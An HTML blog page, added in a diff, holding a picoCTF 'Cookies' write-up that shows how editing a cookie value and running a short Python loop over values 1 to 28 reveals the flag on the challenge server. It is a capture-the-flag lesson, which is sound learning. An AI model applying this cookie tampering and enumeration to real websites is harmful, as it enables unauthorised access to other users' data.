@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cookies</title>
+    <link rel="stylesheet" href="/css/blog.css">
+</head>
+<body>
+    <nav>
+        <ul>
+            <li><a href="/">Home</a></li>
+            <li><a href="/Projects.html">Projects</a></li>
+            <li><a href="/Blogs.html">Blog</a></li>
+        </ul>
+    </nav>
+    <div class="container">
+<div class="section" id="cookies---write-up"><h1>Cookies - Write-Up</h1>
+
+<p><strong>Date:</strong> 13/03/2025  </p>
+<p><strong>Challenge Category:</strong> #Web-Security  </p>
+<p>Platform: #picoCTF </p>
+<p><strong>Difficulty:</strong> #Easy </p>
+<p><strong>Status:</strong> #Solved </p>
+
+<hr>
+</div><div class="section" id="problem-description"><h2>Problem Description</h2>
+
+<p>*Who doesn't love cookies? </p>
+<p>Try to figure out the best one. <a href="http://mercury.picoctf.net:27177/" class="read-more">http://mercury.picoctf.net:27177/</a>*</p>
+
+<p>- <strong>Target:</strong> http://mercury.picoctf.net:27177/</p>
+<p>- <strong>Goal:</strong> extract a flag</p>
+<p>- <strong>Initial Observations:</strong> From the challenge name it seems that we will be dealing with cookies.</p>
+<hr>
+
+</div><div class="section" id="tools-used"><h2>Tools Used</h2>
+
+<p>- Cookie-Editor Extension</p>
+<p>- Python script</p>
+<p>- Burp Suite</p>
+
+<hr>
+
+</div><div class="section" id="solution-steps"><h2>Solution Steps</h2>
+
+
+<ol>
+  <li><strong>Inspecting the page</strong>   if search with the placeholder <code>snickerdoodle</code> we get this response <br><img src="pics/Pasted image 20250313080345.png" alt="Pasted image 20250313080345.png"><br> let's see the cookie editor extension <br><img src="pics/Pasted image 20250313080434.png" alt="Pasted image 20250313080434.png"><br> let's try to change the cookie value to a random number like 5 and see what happens <br><img src="pics/Pasted image 20250313080547.png" alt="Pasted image 20250313080547.png"> so by changing the cookie value we get different cookie names    </li>
+  <li><strong>How to get the cookie value of the flag</strong>   let's see the request passed  <br><img src="pics/Pasted image 20250313080826.png" alt="Pasted image 20250313080826.png"><br> <img src="pics/Pasted image 20250313080943.png" alt="Pasted image 20250313080943.png"><br> So this is the request and response so I can make a python script to brute force the cookie value until the header of the picoCTF flag <code>picoCTF{</code> </li>
+  <li><strong>The python script</strong>   First of all let's see the maximum cookie value. After few tries I found that the maximum value is 28 so let's start typing the script. <pre><code>python
+</li>
+</ol>import requests
+import re
+
+<p>url = "http://mercury.picoctf.net:27177/check"</p>
+
+<p>headers = {</p>
+<p>    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",</p>
+<p>    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9",</p>
+<p>    "Referer": "http://mercury.picoctf.net:27177/",</p>
+<p>}</p>
+
+<p>for i in range(1, 29):  </p>
+<p>    cookies = {"name": str(i)}</p>
+    
+<p>    response = requests.get(url, headers=headers, cookies=cookies)</p>
+<p>    match = re.search(r"picoCTF\{.*?\}", response.text)</p>
+    
+<p>    if "picoCTF{" in response.text:</p>
+<p>        print(f"🎉 Flag found! Cookie value: {i}")</p>
+<p>        print(match.group(0))</p>
+<p>        break</p>
+<p>    else:</p>
+<p>        print(f"Tried cookie value: {i} - No flag found.")</p>
+<p></code></pre> </p>
+
+<p>First from the request we captured by burp let's put it then try to extract the flag by regex expression.</p>
+
+
+
+
+<hr>
+
+</div>
+<div class="section">
+            <a href="/blogs/picoCTF/picoCTF.html" class="read-more">← Back to All Challenges</a>
+        </div>
+        <footer>
+        <p>&copy; 2025 T4QI. All rights reserved.</p>
+    </footer>
+    </div>
+</body>
+</html>
